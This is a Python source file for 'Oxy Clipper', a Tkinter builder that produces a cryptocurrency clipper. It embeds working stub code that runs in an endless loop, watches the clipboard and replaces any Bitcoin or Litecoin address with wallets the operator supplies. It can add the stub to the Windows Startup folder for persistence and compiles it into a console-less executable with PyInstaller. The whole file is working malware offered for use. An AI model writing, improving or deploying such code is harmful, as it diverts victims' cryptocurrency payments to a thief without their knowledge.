# keep credits Keevo, Discord: j.r7
# dont be a skid btw

from tkinter import *
from tkinter import messagebox
import os
import shutil
import subprocess
import requests
import ctypes, sys
from pathlib import Path
checkbox_state = False

def toggle_checkbox():
    global checkbox_state
    checkbox_state = not checkbox_state
    if checkbox_state:
        button_2.configure(image=check_true_image)
    else:
        button_2.configure(image=check_false_image)

def update_startup_code():
    if checkbox_state:
        code_to_add = """
def add_to_startup():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

add_to_startup()
"""
        code_updated = kaka + code_to_add + nostartup
    else:
        code_updated = kaka + nostartup

    return code_updated

def convert_to_exe():
    subprocess.call(["pyinstaller", "--onefile", "--icon=assets/output_ico.ico", "--hidden-import=cryptography", "--hidden-import=pyperclip", "--noconsole", "stub.py"])
    exe_path = os.path.join("dist", "stub.exe")
    shutil.move(exe_path, "stub.exe")
    os.remove(f"stub.spec")
    os.remove(f"stub.py")
    shutil.rmtree("dist")
    shutil.rmtree("build")
    messagebox.showinfo("Oxy Clipper", "successfully created stub.exe")

def save_to_file(code):
    with open("stub.py", "w") as file:
        file.write(code)

def button_1_clicked():
    btc_address_value = entry_1.get()
    ltc_address_value = entry_2.get()
    updated_code = kaka.replace('BTC_address = add1', f'BTC_address = "{btc_address_value}"').replace('LTC_address = add2', f'LTC_address = "{ltc_address_value}"') + nostartup
    save_to_file(updated_code)
    convert_to_exe()
    
window = Tk()
window.geometry("455x489")
window.configure(bg="#FFFFFF")
window.title("Oxy Clipper - by Keevo - Oxy Development")
window.iconbitmap("assets/icon.ico")


kaka = f"""
import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import pyperclip as pc
import time
import re
import shutil

BTC_address = add1
LTC_address = add2
"""

nostartup = """

def replace_address(match):
    if match.group(0).startswith('bc1') or match.group(0).startswith('1') or match.group(0).startswith('3'):
        return BTC_address
    elif match.group(0).startswith(('L', 'M', '3')):
        return LTC_address

def clip():
    s = str(pc.paste())
    length_of_s = len(s)
    btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]+", s)
    ltc_check = re.match("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", s)

    if btc_check:
        s = re.sub("^(bc1|[13])[a-zA-HJ-NP-Z0-9]+", replace_address, s)
    elif ltc_check:
        s = re.sub("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", replace_address, s)

    pc.copy(s)
    time.sleep(0.25)

while True:
    clip()
"""


canvas = Canvas(
    window,
    bg="#FFFFFF",
    height=489,
    width=455,
    bd=0,
    highlightthickness=0,
    relief="ridge"
)

canvas.place(x=0, y=0)
image_image_1 = PhotoImage(
    file="assets/image_1.png")
image_1 = canvas.create_image(
    227.0,
    244.0,
    image=image_image_1
)

image_image_2 = PhotoImage(
    file="assets/image_2.png")
image_2 = canvas.create_image(
    82.0,
    57.0,
    image=image_image_2
)

canvas.create_text(
    133.0,
    27.0,
    anchor="nw",
    text="Oxy Crypto Clipper",
    fill="#FFFFFF",
    font=("Lexend Bold", 30 * -1)
)

canvas.create_text(
    133.0,
    27.0,
    anchor="nw",
    text="Oxy",
    fill="#580AFF",
    font=("Lexend Bold", 30 * -1)
)

image_image_3 = PhotoImage(
    file="assets/image_3.png")
image_3 = canvas.create_image(
    52.0,
    279.0,
    image=image_image_3
)

image_image_4 = PhotoImage(
    file="assets/image_4.png")
image_4 = canvas.create_image(
    51.00000662875209,
    185.0,
    image=image_image_4
)

canvas.create_text(
    133.0,
    65.0,
    anchor="nw",
    text="by Keevo",
    fill="#FFFFFF",
    font=("Lexend Bold", 20 * -1)
)

entry_image_1 = PhotoImage(
    file="assets/entry_1.png")
entry_bg_1 = canvas.create_image(
    265.5,
    184.0,
    image=entry_image_1
)

entry_1 = Entry(
    bd=0,
    bg="#1C1B1A",
    fg="#FFFFFF",
    font=("Arial", 15),
    highlightthickness=0
)
entry_1.place(
    x=113.0,
    y=163.0,
    width=305.0,
    height=40.0
)

entry_image_2 = PhotoImage(
    file="assets/entry_2.png")
entry_bg_2 = canvas.create_image(
    265.5,
    280.0,
    image=entry_image_2
)

entry_2 = Entry(
    bd=0,
    bg="#1C1B1A",
    fg="#FFFFFF",
    font=("Arial", 15),
    highlightthickness=0
)
entry_2.place(
    x=113.0,
    y=259.0,
    width=305.0,
    height=40.0
)

canvas.create_text(
    103.0,
    130.0,
    anchor="nw",
    text="Bitcoin Wallet:",
    fill="#FFFFFF",
    font=("Lexend Bold", 15 * -1)
)

canvas.create_text(
    103.0,
    230.0,
    anchor="nw",
    text="Litecoin Wallet:",
    fill="#FFFFFF",
    font=("Lexend Bold", 15 * -1)
)

button_image_1 = PhotoImage(
    file="assets/button_1.png")
button_1 = Button(
    image=button_image_1,
    borderwidth=0,
    background="#1C1B1A",
    activebackground="#1C1B1A",
    highlightthickness=0,
    command=button_1_clicked,
    relief="flat"
)
button_1.place(
    x=127.0,
    y=421.0,
    width=200.0,
    height=59.0
)

canvas.create_text(
    150.0,
    340.0,
    anchor="nw",
    text="Add to Startup",
    fill="#B3B3B3",
    font=("Lexend Bold", 30 * -1)
)

canvas.create_text(
    150.0,
    340.0,
    anchor="nw",
    text="Add to Startup",
    fill="#B3B3B3",
    font=("Lexend Bold", 30 * -1)
)

check_false_image = PhotoImage(
    file="assets/check_false.png")
check_true_image = PhotoImage(
    file="assets/check_true.png")

button_2 = Button(
    image=check_false_image,
    borderwidth=0,
    background="#1C1B1A",
    activebackground="#1C1B1A",
    highlightthickness=0,
    command=toggle_checkbox,
    relief="flat"
)
button_2.place(
    x=98.0,
    y=350.0,
    width=36.0,
    height=36.0
)

#def check_link_content():
#    try:
#        response = requests.get("api/clipper.txt")
#        content = response.text
#        if "work" in content:
#            window.resizable(False, False)
#            window.mainloop()
#        else:
#            messagebox.showerror("End", "Thank you for using, the end")
#            window.destroy()
#    except requests.exceptions.RequestException as e:
#        print(f"Error")
#        window.destroy()

def install_font(font_path):
    font_path = Path(font_path).resolve()

    font_name = 'Lexend-Bold'
    if is_font_installed(font_name):
        window.mainloop()
        return

    destination_path = Path(os.path.expandvars(r"%WINDIR%\Fonts")) / font_path.name
    subprocess.run(['copy', str(font_path), str(destination_path)], shell=True)
    
    subprocess.run(['reg', 'add', 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts', '/v', font_name, '/t', 'REG_SZ', '/d', font_path.name, '/f'], shell=True)

    window.mainloop()

def is_font_installed(font_name):
    command = ['reg', 'query', 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts', '/v', font_name]
    result = subprocess.run(command, capture_output=True, text=True, shell=True)

    return result.returncode == 0


def foont():
    font_path = "assets/Lexend-Bold.ttf"
    if not os.path.isfile(font_path):
        return

    install_font(font_path)

foont()
